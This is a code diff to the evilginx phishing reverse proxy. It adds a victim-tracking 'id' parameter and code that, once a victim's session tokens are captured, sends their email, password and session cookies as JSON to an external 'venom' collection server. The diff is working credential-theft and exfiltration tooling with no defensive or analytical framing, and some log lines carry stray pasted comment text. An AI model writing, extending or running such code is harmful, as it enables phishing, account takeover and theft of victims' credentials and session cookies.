@@ -30,9 +30,8 @@ import (
 	"strings"
 	"sync"
 	"time"
-
 	"golang.org/x/net/proxy"
-
+	"encoding/json"
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
@@ -51,7 +50,7 @@ const (
 const (
 	HOME_DIR = ".evilginx"
 )
-
+var idKey string
 const (
 	httpReadTimeout  = 45 * time.Second
 	httpWriteTimeout = 45 * time.Second
@@ -67,6 +66,7 @@ type HttpProxy struct {
 	crt_db            *CertDb
 	cfg               *Config
 	db                *database.Database
+	t                 *Terminal
 	bl                *Blacklist
 	sniListener       net.Listener
 	isRunning         bool
@@ -80,8 +80,21 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	username 		  string
+	password		  string
 }
+type DataVenom struct {
+	Email    string `json:"Email"`
+	Password string `json:"Password"`
+	Cookies  string `json:"Cookies"`
+}
+type PostToVenom struct {
+	AppKey    string `json:"app_key"`
+	SecretKey string `json:"secret_key"`
+	Receiver  string `json:"receiver"`
+	Data      DataVenom   `json:"data"`
 
+}
 type ProxySession struct {
 	SessionId    string
 	Created      bool
@@ -130,6 +143,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+		id := req.URL.Query().Get("id")
+		if id != "" {
+			log.Info("Received id: %s", id)
+		}
 		req.URL.Scheme = "https"
 		req.URL.Host = req.Host
 		p.Proxy.ServeHTTP(w, req)
@@ -183,7 +200,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req_url += "?" + req.URL.RawQuery
 				//req_path += "?" + req.URL.RawQuery
 			}
-
+			re := regexp.MustCompile(`id=([^&]+)`)
+			matches := re.FindStringSubmatch(req_url)
+			
+			if len(matches) > 1 {
+				idKey = matches[1]
+				log.Info("Received id: %s", idKey)
+			}
+				
 			//log.Debug("http: %s", req_url)
 
 			parts := strings.SplitN(req.RemoteAddr, ":", 2)
@@ -541,13 +565,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								pm := pl.password.search.FindStringSubmatch(string(body))
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
-									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									log.Success("[%d] Password: [%s] with json", ps.Index, pm[1])
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
 								}
 							}
-
+							
 							for _, cp := range pl.custom {
 								if cp.tp == "json" {
 									cm := cp.search.FindStringSubmatch(string(body))
@@ -557,38 +581,46 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
 										}
-									}
+									}	
 								}
+								
+								
 							}
+							
 
 						} else {
 
 							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
-								log.Debug("POST: %s", req.URL.Path)
+								
+								
 
 								for k, v := range req.PostForm {
-									// patch phishing URLs in POST params with original domains
-
 									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
-											p.setSessionUsername(ps.SessionId, um[1])
-											log.Success("[%d] Username: [%s]", ps.Index, um[1])
+											
+											log.Success("[%d] Username: [%s] patch phishing URLs in POST params with original domains", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
 										}
 									}
+									
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
 										pm := pl.password.search.FindStringSubmatch(v[0])
 										if pm != nil && len(pm) > 1 {
-											p.setSessionPassword(ps.SessionId, pm[1])
-											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+											log.Success("[%d] Password: [%s] patch phishing URLs in POST params with original domains", ps.Index, pm[1])
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
 										}
 									}
+								}
+
+								
+									
+								
+								for k, v := range req.PostForm {
 									for _, cp := range pl.custom {
 										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
 											cm := cp.search.FindStringSubmatch(v[0])
@@ -602,7 +634,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
-
+								
+								
+								// log.Success("username detect : %s, password : %s", usernames, passwords)
+								
+							
+					
+								
 								for k, v := range req.PostForm {
 									for i, vv := range v {
 										// patch phishing URLs in POST params with original domains
@@ -754,7 +792,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			resp.Header.Del("Set-Cookie")
 			for _, ck := range cookies {
 				// parse cookie
-
+				
 				// add SameSite=none for every received cookie, allowing cookies through iframes
 				if ck.Secure {
 					ck.SameSite = http.SameSiteNoneMode
@@ -849,8 +887,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// we have all auth tokens
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
-						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
 
+					
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
 						}
@@ -861,6 +899,35 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.IsDone = true
+						ses := p.db.GetSessionById(ps.SessionId)
+						log.Success("[%d] all authorization tokens intercepted! trying to send data to venom", ps.Index)
+						// send data to venom api
+						jsonTokens := p.t.cookieTokensToJSON(pl, ses.CookieTokens)
+						log.Success("User : %s && Pass : %s && Cookies : %s", ses.Username, ses.Password, jsonTokens)
+						data := DataVenom{
+							Email:    ses.Username,
+							Password: ses.Password,
+							Cookies:  jsonTokens,
+						}
+						payload := PostToVenom{
+							AppKey:    p.cfg.GetServerAppKey(),
+							SecretKey: p.cfg.GetServerSecretKey(),
+							Receiver:  idKey,
+							Data:      data,
+						}
+						jsonData, err := json.Marshal(payload)
+						if err != nil {
+							log.Error("send to venom: %v", err)
+						}
+						
+						resp, err := http.Post(p.cfg.GetServerVenom(), "application/json", bytes.NewBuffer(jsonData))
+						if err != nil {
+							log.Error("send to venom: %v", err)
+						}
+					
+						defer resp.Body.Close()
+						body, _ := ioutil.ReadAll(resp.Body)
+						log.Success("[%d] response Body: %s", ps.Index, string(body))
 					}
 				}
 			}
